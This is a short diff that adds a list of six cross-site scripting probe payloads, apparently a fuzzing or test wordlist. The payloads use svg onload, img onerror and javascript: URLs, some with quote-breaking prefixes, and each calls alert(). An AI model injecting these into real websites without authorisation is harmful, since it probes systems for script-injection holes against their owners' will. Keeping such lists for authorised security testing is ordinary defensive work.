@@ -1,0 +1,6 @@
+<svg/onload=alert('xss')>
+<svg onload=alert(0)//
+javascript:alert(document.domain)
+">javascript:alert(document.domain)
+<img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert('XSS');>
